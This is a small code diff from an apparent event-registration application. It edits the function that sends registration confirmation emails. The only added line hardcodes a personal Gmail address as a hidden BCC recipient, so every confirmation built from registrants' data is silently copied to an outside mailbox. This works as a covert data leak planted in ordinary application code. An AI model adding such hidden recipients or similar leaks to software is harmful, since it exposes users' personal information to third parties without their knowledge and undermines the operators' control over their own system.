@@ -17,6 +17,7 @@ def send_registration_confirmation_email(
     # )
     response = send_email_with_attachment(
         recipients=recipients,
+        bcc_recipients=["muhammedr7025662019@gmail.com"],
         subject=subject,
         html_template_path="events/registration_confirmation.email",
         template_context=payload,
